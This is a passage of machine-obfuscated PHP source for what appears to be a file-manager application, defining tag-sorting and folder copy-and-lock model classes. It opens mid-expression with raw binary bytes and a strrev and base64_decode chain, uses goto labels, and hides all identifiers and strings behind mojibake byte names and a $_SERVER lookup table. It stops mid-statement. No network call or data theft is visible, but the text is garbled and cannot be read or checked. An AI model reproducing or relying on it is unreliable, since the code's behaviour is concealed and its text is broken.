ô‚\\Ó¡(˜°$TpïL0$Ğ¹î')."\xae\x6c\x2c\x3f\xcd\xf1\xc3\x3b\x93\x5e\x72\xd3\xe1\x5\x5f\xc3\xeb\x4a\x59\x47\x75\xfa\xb4\x38\xd7\x94\xff\xba\x16\x40\xca\x2f\x9a\xa0\x8f\xc2\x11\xa9\x2e\x18\x2a\x26\x92\x89\xaa\xac\xde\x40\x22\xb1\x2a\x16\xef\xa4\x6f\xc8".strrev('¥n·H"ÅÑ—ïvÑ'."\n".'àá®Ÿó¹%é/p¬ÓƒÜ*¨ÈaåT\'¨^]:,woVUc^’Z“eU').base64_decode('nFmcbh1ZAwmNeWCUL6D0gvApLxpxStHkSyqLPUfDA86HpF36xk4NGga50CzWa4zCl+IlSMUP8XE=').base64_decode('BMDPE0KXxudQ45HSySYhWEfauzJ1Jxe3XLhGsufUnM0at4fyFSzOFZODu3kkexlnnZmSNBjp2Q4=')."\174\21\300\164\113\232\254\64\354\310\266\265\254\227\243\3\111\101\205\12\274\61\122\20\242\350\377\15\34\375\76\60\145\311\0\0", 10, -8))); goto e‰àÃ¼’É˜; F‰²ßÈ³¥: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\164\x61\147\114\151\x73\x74"; public $modelType = "\x55\163\145\x72\117\x70\164\x69\157\156"; public $field = array("\156\x61\x6d\145", "\163\164\x79\154\x65", "\x73\x6f\x72\x74"); public function listData($êª­ÑÅÏ = false, $Õ¾“òó = "\x73\157\x72\164", $ÍûëÉ·° = false) { return parent::listData($êª­ÑÅÏ, $Õ¾“òó, $ÍûëÉ·°); } public function remove($Ûı¿èå—) { return parent::remove($Ûı¿èå—); } public function add($·ëÙë‡ø, $Àí­´ÜÓ = "\154\141\142\x65\154\55\147\162\145\171\x2d\156\157\x72\x6d\141\x6c") { $ˆË­ƒ =& $_SERVER[ïÃ°£«Ê]; if ($this->findByName($·ëÙë‡ø)) { return !1; } $µü‰õææ = array($ˆË­ƒ[509] => $·ëÙë‡ø, $ˆË­ƒ[574] => $Àí­´ÜÓ, $ˆË­ƒ[2189] => $this->getSort($ˆË­ƒ[335]) + 1); return parent::insert($µü‰õææ); } public function update($æØò¶¼, $­ËÛµ€á) { $öŠ­ªµ =& $_SERVER[ïÃ°£«Ê]; $Éí«ùÚÀ = $this->listData($æØò¶¼); $û©ßœ = $this->findByName($­ËÛµ€á[$öŠ­ªµ[32]]); if (!$Éí«ùÚÀ || $û©ßœ && $û©ßœ[$öŠ­ªµ[487]] != $Éí«ùÚÀ[$öŠ­ªµ[487]]) { return !1; } return parent::update($æØò¶¼, $­ËÛµ€á); } public function moveTop($Äûˆ×¡Ã) { $ºµ„×šœ =& $_SERVER[ïÃ°£«Ê]; $ÑÌÊÆøœ = parent::listData(); $÷ÓôÂ÷ = $this->getSort($ºµ„×šœ[334]); foreach ($ÑÌÊÆøœ as &$É·ÜİÃÎ) { if ($É·ÜİÃÎ[$ºµ„×šœ[487]] == $Äûˆ×¡Ã) { $É·ÜİÃÎ[$ºµ„×šœ[2207]] = $÷ÓôÂ÷; continue; } $É·ÜİÃÎ[$ºµ„×šœ[2207]] += 1; } unset($É·ÜİÃÎ); return parent::resetData($ÑÌÊÆøœ); } public function moveBottom($ìÙ”Ÿ‡) { $½×³×Ï =& $_SERVER[ïÃ°£«Ê]; $µ’´»øÉ = $this->getSort($½×³×Ï[335]) + 1; return parent::update($ìÙ”Ÿ‡, array($½×³×Ï[2207] => $µ’´»øÉ)); } public function resetSort($ÚëœçÃ) { $†¹•­Ùù =& $_SERVER[ïÃ°£«Ê]; $Ä²¯Ü…· = array(); $ÚëœçÃ = is_array($ÚëœçÃ) ? $ÚëœçÃ : array(); for ($íç«˜¾ = 0; $íç«˜¾ < count($ÚëœçÃ); $íç«˜¾++) { $Ä²¯Ü…·[$ÚëœçÃ[$íç«˜¾] . $†¹•­Ùù[12]] = $íç«˜¾ + 1; } $ğ¢¾¬Ñ = parent::listData(); foreach ($ğ¢¾¬Ñ as &$üöŞ¡äÚ) { $ÂìúÇÒ = $Ä²¯Ü…·[$üöŞ¡äÚ[$†¹•­Ùù[487]]]; $üöŞ¡äÚ[$†¹•­Ùù[2207]] = $ÂìúÇÒ ? $ÂìúÇÒ : $üöŞ¡äÚ[$†¹•­Ùù[2207]]; } unset($üöŞ¡äÚ); return parent::resetData($ğ¢¾¬Ñ); } private function getSort($Á‡ºÛÍŠ) { $°·ÌÏ‹ =& $_SERVER[ïÃ°£«Ê]; $šÊÛêï· = parent::listData(); $äğÀÅÖ„ = array_to_keyvalue($šÊÛêï·, $°·ÌÏ‹[12], $°·ÌÏ‹[2207]); if (!$äğÀÅÖ„) { $äğÀÅÖ„ = array(0); } $ŒÚ™ÈÛ÷ = $Á‡ºÛÍŠ == $°·ÌÏ‹[335] ? max($äğÀÅÖ„) : min($äğÀÅÖ„); return intval($ŒÚ™ÈÛ÷); } } goto c“Ğ§¥Éš; d²õ˜İ¼ –: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($à¶ÄİÏŠ) { $¡õ¹ÌÏÕ =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡õ¹ÌÏÕ[641], $à¶ÄİÏŠ); $—¬ñ×Å = 1; $this->_lockEvent($à¶ÄİÏŠ, array($¡õ¹ÌÏÕ[642], $¡õ¹ÌÏÕ[643]), $—¬ñ×Å); $this->_lockParent($à¶ÄİÏŠ, array($¡õ¹ÌÏÕ[643]), $—¬ñ×Å); $this->_lockEvent($à¶ÄİÏŠ, array($¡õ¹ÌÏÕ[644], $¡õ¹ÌÏÕ[645]), $—¬ñ×Å); $this->_lockCheckEnd($¡õ¹ÌÏÕ[641], $à¶ÄİÏŠ); } public function lockCopyEnd($üäÙÆœÈ) { $ËòÍ” =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $ª‡òƒå¶ = 0; $this->_lockEvent($üäÙÆœÈ, array($ËòÍ”[642], $ËòÍ”[643]), $ª‡òƒå¶); $this->_lockParent($üäÙÆœÈ, array($ËòÍ”[643]), $ª‡òƒå¶); $this->_lockEvent($üäÙÆœÈ, array($ËòÍ”[644], $ËòÍ”[645]), $ª‡òƒå¶); } public function lockWriteStart($º¬ŸŞşŠ, $ğ ªÁŞ = '') { $ˆîì·ÏÓ =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆîì·ÏÓ[642], $º¬ŸŞşŠ); $‰óØÄõß = 1; $this->_lockKey($ˆîì·ÏÓ[646] . $º¬ŸŞşŠ . $ˆîì·ÏÓ[10] . $ğ ªÁŞ, $‰óØÄõß); $this->_lockEvent($º¬ŸŞşŠ, array($ˆîì·ÏÓ[641], $ˆîì·ÏÓ[643]), $‰óØÄõß); $this->_lockParent($º¬ŸŞşŠ, array($ˆîì·ÏÓ[641], $ˆîì·ÏÓ[643]), $‰óØÄõß); $this->_lockCheckEnd($ˆîì·ÏÓ[642], $º¬ŸŞşŠ); } public function lockWriteEnd($üÊÇœ¾ô, $ùÕû©ô = '') { $¸ã„Ùé =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $¶ËË¬¦ú = 0; $this->_lockKey($¸ã„Ùé[646] . $üÊÇœ¾ô . $¸ã„Ùé[10] . $ùÕû©ô, $¶ËË¬¦ú); $this->_lockEvent($üÊÇœ¾ô, array($¸ã„Ùé[641], $¸ã„Ùé[643]), $¶ËË¬¦ú); $this->_lockParent($üÊÇœ¾ô, array($¸ã„Ùé[641], $¸ã„Ùé[643]), $¶ËË¬¦ú); } public function lockMoveStart($Âå²µôê) { $şÇëÇÎ± =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($şÇëÇÎ±[643], $Âå²µôê); $½¥çæø = 1; $this->_lockKey($şÇëÇÎ±[647] . $Âå²µôê, $½¥çæø); $this->_lockEvent($Âå²µôê, array($şÇëÇÎ±[641], $şÇëÇÎ±[642]), $½¥çæø); $this->_lockParent($Âå²µôê, array($şÇëÇÎ±[641], $şÇëÇÎ±[643]), $½¥çæø); $this->_lockEvent($Âå²µôê, array($şÇëÇÎ±[648], $şÇëÇÎ±[644], $şÇëÇÎ±[645]), $½¥çæø); $this->_lockCheckEnd($şÇëÇÎ±[643], $Âå²µôê); } public function lockMoveEnd($»ìı—¤) { $ÜÁ––ÑÄ =& $_SERVER[ïÃ°£«Ê]; if (!$this->allowLock()) { return; } $Ú™ó¼Œ– = 0; $this->_lockKey($ÜÁ––ÑÄ[647] . $»ìı—¤, $Ú™ó¼Œ–); $this->_lockEvent($»ìı—¤, array($ÜÁ––ÑÄ[641], $ÜÁ––ÑÄ[642]), $Ú™ó¼Œ–); $this->_lockParent($»ìı—¤, array($ÜÁ––ÑÄ[641], $ÜÁ––ÑÄ[643]), $Ú™ó¼Œ–); $this->_lockEvent($»ìı—¤, array($ÜÁ––ÑÄ[648], $ÜÁ––ÑÄ[644], $ÜÁ––ÑÄ[645]), $Ú™ó¼Œ–); } private function _lockCheck($¦İ‚±Ï , $ªŸÛÖÛ²) { $îÚÉÔá© =& $_SERVER[ïÃ°£«Ê]; $³Ñõ‚¯è = $this->sourceInfo($ªŸÛÖÛ²); $‰‹’‚Åõ = $¦İ‚±Ï  . $îÚÉÔá©[10] . $ªŸÛÖÛ²; $this->_lockTimeStart[$‰‹’‚Åõ] = timeFloat(); if (!is_array($³Ñõ‚¯è)) { return; } $ïŸ‚Â« = LNG($îÚÉÔá©[649]); CacheLock::setErrorMsg($îÚÉÔá©[173] . htmlspecialchars($³Ñõ‚¯è[$îÚÉÔá©[32]]) . $îÚÉÔá©[175] . $ïŸ‚Â«); $this->_lockKey($‰‹’‚Åõ, 1); $this->_lockKey($‰‹’‚Åõ, 0); $½±€ìÇµ = array_reverse($this->parentLevelArray($³Ñõ‚¯è[$îÚÉÔá©[604]])); foreach ($½±€ìÇµ as $ÌŞ ¤¨³) { $‰‹’‚Åõ = $¦İ‚±Ï  . $îÚÉÔá©[650] . $ÌŞ ¤¨³; if (CacheLock::lockGet($îÚÉÔá©[651] . $‰‹’‚Åõ)) { $³Ñõ‚¯è = $this->sourceInfo($ÌŞ ¤¨³); CacheLock::setErrorMsg($îÚÉÔá©[173] . htmlspecialchars($³Ñõ‚¯è[$îÚÉÔá©[32]]) . $îÚÉÔá©[175] . $ïŸ‚Â«); $this->_lockKey($‰‹’‚Åõ, 1); $this->_lockKey($‰‹’‚Åõ, 0); } } } private function _lockCheckEnd($çá¿Äó, $²„Í°ÀÌ) { $¯Ä…Ùõ¥ =& $_SERVER[ïÃ°£«Ê]; $üğÁÃöÎ = $çá¿Äó . $¯Ä…Ùõ¥[10] . $²„Í°ÀÌ; CacheLock::setErrorMsg($¯Ä…Ùõ¥[463]); if (!isset($this->_lockTimeStart[$üğÁÃöÎ])) { return; } $ÙËÈÕ¹ = timeFloat() - $this->_lockTimeStart[$üğÁÃöÎ]; unset($this->_lockTimeStart[$üğÁÃöÎ]); if ($ÙËÈÕ¹ > 0.5) { unset(self::$cacheSourceInfo[$¯Ä…Ùõ¥[547] . $²„Í°ÀÌ]); } $Ôƒ¤»‰• = $this->sourceInfo($²„Í°ÀÌ); if (!$Ôƒ¤»‰•) { show_json(LNG($¯Ä…Ùõ¥[105]), !1); } } private function _lockParent($‘¡•²ş, $€ÎÓìƒØ, $íğı¶•®) { if (!$this->autoLockSet) { return; } $ûã¨ãÀß = $this->sourceInfo($‘¡•²ş); if (!is_array($ûã¨ãÀß)) { return; } $çÑÓ¤È° = array_reverse($this->parentLevelArray($ûã¨ãÀß[$_SERVER[ïÃ°£«Ê][604]])); foreach ($çÑÓ¤È° as $Ôè•œ¦) { $this->_lockEvent($Ôè•œ¦, $€ÎÓìƒØ, $íğı¶•®); } } private function _lockEvent($Ïâ–ˆèø, $Ã–äØäØ, $Äôš‚šÕ) { $˜ÕŒ™ïÅ =& $_SERVER[ïÃ°£«Ê]; if (!$this->autoLockSet) { return; } foreach ($Ã–äØäØ as $› ˜‡Öà) { $ÁÊ£Ç«ø = $› ˜‡Öà . $˜ÕŒ™ïÅ[10] . $Ïâ–ˆèø; if ($Äôš‚šÕ && CacheLock::lockGet($˜ÕŒ™ïÅ[651] . $ÁÊ£Ç«ø)) { continue; } $this->_lockKey($ÁÊ£Ç«ø, $Äôš‚šÕ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($èéÚŒç, $ğ—‚ûƒå = 1) { $Áè´íêÓ = $_SERVER[ïÃ°£«Ê][651] . md5($èéÚŒç); if ($ğ—‚ûƒå) { if (isset(self::$_lockItemArr[$Áè´íêÓ])) { return; } self::$_lockItemArr[$Áè´íêÓ] = 1; CacheLock::lock($Áè´íêÓ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Áè´íêÓ])) { return; } unset(self::$_lockItemArr[$Áè´íêÓ]); CacheLock::unlock($Áè´íêÓ); } } public function isParentOf($á¸‹äø, $ïÀ¤¹È) { $¶øÆŒî¥ =& $_SERVER[ïÃ°£«Ê]; $½ÈÙóê´ = $this->sourceInfo($á¸‹äø); $«—íÂ¯ƒ = $this->sourceInfo($ïÀ¤¹È); $ÂåÑŒîğ = $½ÈÙóê´[$¶øÆŒî¥[604]] . $½ÈÙóê´[$¶øÆŒî¥[191]] . $¶øÆŒî¥[50]; $¿‚ñ—’ = $«—íÂ¯ƒ[$¶øÆŒî¥[604]] . $«—íÂ¯ƒ[$¶øÆŒî¥[191]] . $¶øÆŒî¥[50]; $¸¸ÍÒ± = strpos($¿‚ñ—’, $ÂåÑŒîğ) === 0; return $¸¸ÍÒ±; } private $targetIsDelete = 0; public function copy($¶¡ãâõÔ, $Ë ËãÌ‰, $¯†£é·º = REPEAT_REPLACE, $É”’÷İÂ = '') { $®üÏ€áÑ =& $_SERVER[ïÃ°£«Ê]; $ù³Ã—’º = $this->sourceInfo($¶¡ãâõÔ); $şüô¼Ó  = $this->sourceInfo($Ë ËãÌ‰); if (!$ù³Ã—’º || !$şüô¼Ó  || $şüô¼Ó [$®üÏ€áÑ[500]] != $®üÏ€áÑ[91]) { return !1; } if ($this->isParentOf($¶¡ãâõÔ, $Ë ËãÌ‰)) { return !1; } $î£íÉÄ = $É”’÷İÂ ? $É”’÷İÂ : $ù³Ã—’º[$®üÏ€áÑ[32]]; $this->lockCopyStart($¶¡ãâõÔ); $this->lockWriteStart($Ë ËãÌ‰, $î£íÉÄ); $Ê•ÂˆĞÍ = array($®üÏ€áÑ[652] => array(), $®üÏ€áÑ[653] => array(), $®üÏ€áÑ[654] => array()); $this->targetIsDelete = intval($ù³Ã—’º[$®üÏ€áÑ[520]]); $íÔšúÏ = $this->fileNameExistAuto($Ë ËãÌ‰, $ù³Ã—’º); $ˆœÃ¸«Ì = $this->_copy($¶¡ãâõÔ, $Ë ËãÌ‰, $¯†£é·º, $Ê•ÂˆĞÍ, !0, $É”’÷İÂ); $this->_childrenListClear(); $this->lockCopyEnd($¶¡ãâõÔ); $this->lockWriteEnd($Ë ËãÌ‰, $î£íÉÄ); if ($ù³Ã—’º[$®üÏ€áÑ[500]] == $®üÏ€áÑ[91] && $íÔšúÏ == $ˆœÃ¸«Ì) { $this->folderSizeResetChildren($íÔšúÏ); } Model($®üÏ€áÑ[471])->addAll($Ê•ÂˆĞÍ[$®üÏ€áÑ[653]], array(), !0); if ($íÔšúÏ != $ˆœÃ¸«Ì || $ù³Ã—’º[$®üÏ€áÑ[500]] == $®üÏ€áÑ[91]) { Model($®üÏ€áÑ[655])->eventCopy($ˆœÃ¸«Ì); } $this->saveAll($Ê•ÂˆĞÍ[$®üÏ€áÑ[654]]); Model($®üÏ€áÑ[230])->linkAdd($Ê•ÂˆĞÍ[$®üÏ€áÑ[652]]); $this->folderSizeReset($Ë ËãÌ‰); $this->updateModifyTime($Ë ËãÌ‰); return $ˆœÃ¸«Ì; } private function _copy($Á¹ÌÑïë, $ãÁá¥áí, $„Îâ°«‹, &$ç‰À¿ü», $ÏÃ³µºö, $›·èµÛğ = '') { $ÏøŒ€ =& $_SERVER[ïÃ°£«Ê]; $„´Áğ— = $this->sourceInfoCache($Á¹ÌÑïë); $½Âµ•” = $„´Áğ—[$ÏøŒ€[500]] == $ÏøŒ€[91]; $‡²÷ã = $›·èµÛğ ? $›·èµÛğ : $„´Áğ—[$ÏøŒ€[32]]; $¼¥Ò•Ï« = $this->fileNameExistAuto($ãÁá¥áí, $„´Áğ—); if ($ÏÃ³µºö) { $this->_childrenAllMake($Á¹ÌÑïë); if ($½Âµ•” && $¼¥Ò•Ï«) { $this->_childrenAllMake($¼¥Ò•Ï«); } } if (!$¼¥Ò•Ï«) { return $this->_copyCreate($Á¹ÌÑïë, $ãÁá¥áí, $‡²÷ã, $ç‰À¿ü»); } $ÁÑ¨°ôÓ = $¼¥Ò•Ï«; if ($½Âµ•”) { if ($„Îâ°«‹ == REPEAT_RENAME_FOLDER) { $‡²÷ã = $this->fileNameAutoCache($ãÁá¥áí, $‡²÷ã, $„Îâ°«‹, $½Âµ•”); $ÁÑ¨°ôÓ = $this->_copyCreate($Á¹ÌÑïë, $ãÁá¥áí, $‡²÷ã, $ç‰À¿ü»); } else { $Øš”¤ÆÄ = $this->_childrenList($Á¹ÌÑïë); foreach ($Øš”¤ÆÄ as $‘•ï¸À) { $this->_copy($‘•ï¸À[$ÏøŒ€[191]], $¼¥Ò•Ï«, $„Îâ°«‹, $ç‰À¿ü», !1); } } } else { if ($„Îâ°«‹ == REPEAT_RENAME || $„Îâ°«‹ == REPEAT_RENAME_FOLDER) { $‡²÷ã = $this->fileNameAutoCache($ãÁá¥áí, $‡²÷ã, $„Îâ°«‹, $½Âµ•”); $ÁÑ¨°ôÓ = $this->_copyCreate($Á¹ÌÑïë, $ãÁá¥áí, $‡²÷ã, $ç‰À¿ü»); } else { if ($„Îâ°«‹ == REPEAT_REPLACE) { $Ôğßßšß = $this->sourceInfoCache($¼¥Ò•Ï«); $è±ãÇÇ = $this->fileHistory($Ôğßßšß, $„´Áğ—[$ÏøŒ€[557]], $„´Áğ—[$ÏøŒ€[79]]); if ($è±ãÇÇ) { $ç‰À¿ü»[$ÏøŒ€[652]][] = $„´Áğ—[$ÏøŒ€[557]]; } } else { if ($„Îâ°«‹ == REPEAT_SKIP) { } } } Hook::trigger($ÏøŒ€[656], array($ÏøŒ€[657], $„´Áğ—, 0)); } return $ÁÑ¨°ôÓ; } private function _copyCreate($ş£øƒ„ê, $¤ªà¯»…, $¯Š…üš, &$‰€ğü¹) { $»¼÷ïßÄ =& $_SERVER[ïÃ°£«Ê]; $á‚Ší°» = $this->sourceInfoCache($ş£øƒ„ê); $´Ë‡¼ƒ = $this->sourceInfoCache($¤ªà¯»…); $÷øÈı£ = $this->_makeItemData($á‚Ší°», $´Ë‡¼ƒ, $¯Š…üš); Hook::trigger($»¼÷ïßÄ[658], $÷øÈı£); Hook::trigger($»¼÷ïßÄ[659], array($»¼÷ïßÄ[660], $÷øÈı£, 0)); $’¤Ôµ”² = $this->add($÷øÈı£); $ŞØâ—§¶ = array($»¼÷ïßÄ[191] => $’¤Ôµ”², $»¼÷ïßÄ[32] => $¯Š…üš); $this->_copyApplyMeta($ŞØâ—§¶, $‰€ğü¹); if ($á‚Ší°»[$»¼÷ïßÄ[500]] != $»¼÷ïßÄ[91]) { $‰€ğü¹[$»¼÷ïßÄ[652]][] = $á‚Ší°»[$»¼÷ïßÄ[557]]; return $’¤Ôµ”²; } $â£‚ö¥ = array(); $¾ÂùÔ = array(); $this->_childrenListAll($ş£øƒ„ê, $â£‚ö¥); $Û½àåè = count($â£‚ö¥); if ($Û½àåè == 0) { return $’¤Ôµ”²; } $Â ¶¨Ê› = $this->sourceInfo($’¤Ôµ”²); foreach ($â£‚ö¥ as $áŸ”ºØŒ) { $ëæ»ÛõÜ = $this->_makeItemData($áŸ”ºØŒ, $Â ¶¨Ê›, $áŸ”ºØŒ[$»¼÷ïßÄ[32]]); $ëæ»ÛõÜ[$»¼÷ïßÄ[604]] = $áŸ”ºØŒ[$»¼÷ïßÄ[604]]; $¾ÂùÔ[] = $ëæ»ÛõÜ; } $this->chunkEventSet($»¼÷ïßÄ[661], array($»¼÷ïßÄ[662], $÷øÈı£, $Û½àåè)); $this->addAll($¾ÂùÔ, array(), !1); $ñ±üı¥‡ = $this->where(array($»¼÷ïßÄ[190] => $’¤Ôµ”²))->select(); $ôÖ¨ñıÑ = $this->_childrenMakeRelation($â£‚ö¥, $ñ±üı¥‡); $ôÖ¨ñıÑ[$ş£øƒ„ê] = $’¤Ôµ”²; $Üã¶×Î… = array(); $ëıÂ” = array(); foreach ($ñ±üı¥‡ as $áŸ”ºØŒ) { $Ô®‰ÖŸ› = $áŸ”ºØŒ[$»¼÷ïßÄ[191]]; $†•Ö¹Ú = $this->_childrenMatch($ôÖ¨ñıÑ, $áŸ”ºØŒ, $Â ¶¨Ê›); $Üã¶×Î…[] = array($»¼÷ïßÄ[191], $Ô®‰ÖŸ›, $»¼÷ïßÄ[190], $†•Ö¹Ú[$»¼÷ïßÄ[190]]); $ëıÂ”[] = array($»¼÷ïßÄ[191], $Ô®‰ÖŸ›, $»¼÷ïßÄ[604], $†•Ö¹Ú[$»¼÷ïßÄ[604]]); $this->_copyApplyMeta($áŸ”ºØŒ, $‰€ğü¹); if ($áŸ”ºØŒ[$»¼÷ïßÄ[500]] != $»¼÷ïßÄ[91]) { $‰€ğü¹[$»¼÷ïßÄ[652]][] = $áŸ”ºØŒ[$»¼÷ïßÄ[557]]; } } $this->chunkEventSet($»¼÷ïßÄ[663], array($»¼÷ïßÄ[664], $÷øÈı£, $Û½àåè)); $this->saveAll($Üã¶×Î…); $this->chunkEventSet($»¼÷ïßÄ[665], array($»¼÷ïßÄ[666], $÷øÈı£, $Û½àåè)); $this->saveAll($ëıÂ”); return $’¤Ôµ”²; } private function _childrenMakeRelation($‚³å…¿, $æÒ–¾‡) { $»Ô¿ÁËÉ =& $_SERVER[ïÃ°£«Ê]; $ÒÑİñŠ¶ = array(); $½¾ô–æÒ = array(); foreach ($‚³å…¿ as $òíŸôé) { $ÁâÓÒ×™ = $òíŸôé[$»Ô¿ÁËÉ[32]] . $»Ô¿ÁËÉ[8] . $òíŸôé[$»Ô¿ÁËÉ[604]]; $ÒÑİñŠ¶[$ÁâÓÒ×™] = $òíŸôé[$»Ô¿ÁËÉ[191]]; } foreach ($æÒ–¾‡ as $òíŸôé) { $ÁâÓÒ×™ = $òíŸôé[$»Ô¿ÁËÉ[32]] . $»Ô¿ÁËÉ[8] . $òíŸôé[$»Ô¿ÁËÉ[604]]; $èÛÃ€Ê’ = $ÒÑİñŠ¶[$ÁâÓÒ×™]; $½¾ô–æÒ[$èÛÃ€Ê’] = $òíŸôé[$»Ô¿ÁËÉ[191]]; } return $½¾ô–æÒ; } private function _childrenMatch($„Õò¿¯ˆ, $çü‹“ºĞ, $ãä°‰ñı) { $®ƒÒüş¬ =& $_SERVER[ïÃ°£«Ê]; $ì•­¥•ã = $ãä°‰ñı[$®ƒÒüş¬[604]]; $È—ëìÃ = $this->parentLevelArray($çü‹“ºĞ[$®ƒÒüş¬[604]]); foreach ($È—ëìÃ as $¹ÊüÕ¥ü) { if (isset($„Õò¿¯ˆ[$¹ÊüÕ¥ü])) { $ì•­¥•ã .= $„Õò¿¯ˆ[$¹ÊüÕ¥ü] . $®ƒÒüş¬[667]; } } $ì•­¥•ã = rtrim($ì•­¥•ã, $®ƒÒüş¬[50]) . $®ƒÒüş¬[50]; $üöÌ•—î = $this->parentLevelArray($ì•­¥•ã); $ÍÔÂÈ¥í = $üöÌ•—î[count($üöÌ•—î) - 1]; return array($®ƒÒüş¬[190] => $ÍÔÂÈ¥í, $®ƒÒüş¬[604] => $ì•­¥•ã); } private function _makeItemData($çĞí…İ, $æ›÷¼ˆÈ, $÷Úç‰öƒ) { $×´Íù’ì =& $_SERVER[ïÃ°£«Ê]; $Ñã¢ÅÎâ = array($×´Íù’ì[668] => $çĞí…İ[$×´Íù’ì[500]], $×´Íù’ì[509] => $÷Úç‰öƒ, $×´Íù’ì[669] => $çĞí…İ[$×´Íù’ì[501]] ? $çĞí…İ[$×´Íù’ì[501]] : $×´Íù’ì[12], $×´Íù’ì[558] => $çĞí…İ[$×´Íù’ì[557]] ? $çĞí…İ[$×´Íù’ì[557]] : 0, $×´Íù’ì[640] => $çĞí…İ[$×´Íù’ì[79]] ? $çĞí…İ[$×´Íù’ì[79]] : 0, $×´Íù’ì[670] => intval($æ›÷¼ˆÈ[$×´Íù’ì[188]]), $×´Íù’ì[671] => intval($æ›÷¼ˆÈ[$×´Íù’ì[589]]), $×´Íù’ì[672] => intval(USER_ID), $×´Íù’ì[673] => intval(USER_ID), $×´Íù’ì[492] => intval($æ›÷¼ˆÈ[$×´Íù’ì[191]]), $×´Íù’ì[674] => $æ›÷¼ˆÈ[$×´Íù’ì[604]] . $æ›÷¼ˆÈ[$×´Íù’ì[191]] . $×´Íù’ì[50], $×´Íù’ì[513] => $çĞí…İ[$×´Íù’ì[88]] ? $çĞí…İ[$×´Íù’ì[88]] : time(), $×´Íù’ì[519] => 0, $×´Íù’ì[675] => $×´Íù’ì[12]); return $Ñã¢ÅÎâ; } private function _copyApplyMeta($¨“éğã¨, &$ø¼Àß) { $›¾ˆÕ¯Æ =& $_SERVER[ïÃ°£«Ê]; $öıÚ•† = $¨“éğã¨[$›¾ˆÕ¯Æ[191]]; $á£«²¤ = $¨“éğã¨[$›¾ˆÕ¯Æ[32]]; if (!isset($¨“éğã¨[$›¾ˆÕ¯Æ[676]]) || !$¨“éğã¨[$›¾ˆÕ¯Æ[676]] || $¨“éğã¨[$›¾ˆÕ¯Æ[676]] == $›¾ˆÕ¯Æ[228]) { $ø¼Àß[$›¾ˆÕ¯Æ[654]][] = array($›¾ˆÕ¯Æ[191], $öıÚ•†, $›¾ˆÕ¯Æ[676], short_id($öıÚ•†)); } if (Input::check($á£«²¤, $›¾ˆÕ¯Æ[677])) { $ø¼Àß[$›¾ˆÕ¯Æ[653]][] = array($›¾ˆÕ¯Æ[191] => $öıÚ•†, $›¾ˆÕ¯Æ[95] => $›¾ˆÕ¯Æ[552], $›¾ˆÕ¯Æ[451] => str_replace($›¾ˆÕ¯Æ[53], $›¾ˆÕ¯Æ[12], Pinyin::get($á£«²¤))); $ø¼Àß[$›¾ˆÕ¯Æ[653]][] = array($›¾ˆÕ¯Æ[191] => $öıÚ•†, $›¾ˆÕ¯Æ[95] => $›¾ˆÕ¯Æ[551], $›¾ˆÕ¯Æ[451] => Pinyin::get($á£«²¤, $›¾ˆÕ¯Æ[678])); } $ø¼Àß[$›¾ˆÕ¯Æ[653]][] = array($›¾ˆÕ¯Æ[191] => $öıÚ•†, $›¾ˆÕ¯Æ[95] => $›¾ˆÕ¯Æ[531], $›¾ˆÕ¯Æ[451] => KodSort::makeStr($á£«²¤)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($³Üëıí) { $›ê˜–Ô =& $_SERVER[ïÃ°£«Ê]; $¸Â‚¬§ = $this->sourceInfo($³Üëıí); $ïÈª‚©ú = $›ê˜–Ô[679]; $Şİ¥©À¦ = array($›ê˜–Ô[604] => array($›ê˜–Ô[635], $¸Â‚¬§[$›ê˜–Ô[604]] . $³Üëıí . $›ê˜–Ô[636]), $›ê˜–Ô[520] => $this->targetIsDelete); $ùÎ¾»»ş = $this->field($ïÈª‚©ú)->where($Şİ¥©À¦)->select(); if (!$ùÎ¾»»ş) { return; } $ùÎ¾»»ş = array_to_keyvalue($ùÎ¾»»ş, $›ê˜–Ô[191]); foreach ($ùÎ¾»»ş as $ï‚ë‡í×) { $›Ì¦ÕøÃ = $ï‚ë‡í×[$›ê˜–Ô[190]]; $³Üëıí = $ï‚ë‡í×[$›ê˜–Ô[191]]; if (!isset($this->_childrenListCache[$³Üëıí]) && $ï‚ë‡í×[$›ê˜–Ô[500]] == $›ê˜–Ô[91]) { $this->_childrenListCache[$³Üëıí] = array(); } if (!isset($this->_childrenListCache[$›Ì¦ÕøÃ])) { $this->_childrenListCache[$›Ì¦ÕøÃ] = array(); } $this->_childrenListCache[$›Ì¦ÕøÃ][$³Üëıí] = $ï‚ë‡í×; $this->_childrenItemCache[$³Üëıí] = $ï‚ë‡í×; } } private function _childrenListAll($‹öğØÛÄ, &$âÖşÇøç) { $¨ø‡‡®Û =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->_childrenListCache[$‹öğØÛÄ])) { return; } $ëëáçÕï = $this->_childrenListCache[$‹öğØÛÄ]; foreach ($ëëáçÕï as $ÂÄ€ºò => $¾ÔŞÈáÏ) { $âÖşÇøç[$ÂÄ€ºò] = $¾ÔŞÈáÏ; if ($¾ÔŞÈáÏ[$¨ø‡‡®Û[500]] == $¨ø‡‡®Û[91]) { $this->_childrenListAll($ÂÄ€ºò, $âÖşÇøç); } } } private function sourceInfoCache($ËÒºÂËŠ) { if (isset($this->_childrenItemCache[$ËÒºÂËŠ])) { return $this->_childrenItemCache[$ËÒºÂËŠ]; } return $this->sourceInfo($ËÒºÂËŠ); } private function _childrenList($ê©À àÍ) { if (isset($this->_childrenListCache[$ê©À àÍ])) { return $this->_childrenListCache[$ê©À àÍ]; } return $this->_childrenListSelect($ê©À àÍ); } private function _childrenListSelect($å¯Í†ßº) { $Œı¸–òÑ =& $_SERVER[ïÃ°£«Ê]; $éÌŠ¹° = array($Œı¸–òÑ[190] => $å¯Í†ßº, $Œı¸–òÑ[520] => $this->targetIsDelete); $”ó±‘Ìú = 